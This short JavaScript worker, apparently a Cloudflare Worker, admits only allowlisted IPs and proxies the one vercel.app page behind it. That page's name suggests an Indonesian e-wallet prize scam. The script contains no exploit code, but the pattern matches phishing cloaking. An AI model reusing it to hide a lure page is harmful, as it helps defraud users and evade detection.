const allowedIPs = ['1.2.3.4', '5.6.7.8'];

async function handleRequest(request) {
    const clientIP = request.headers.get('cf-connecting-ip');

    if (!allowedIPs.includes(clientIP)) {
        return new Response('Access Denied', { status: 403 });
    }

    const targetUrl = 'https://layanan4-hadi4h1dana10jt.vercel.app/';
    const response = await fetch(targetUrl);
    return new Response(response.body, response);
}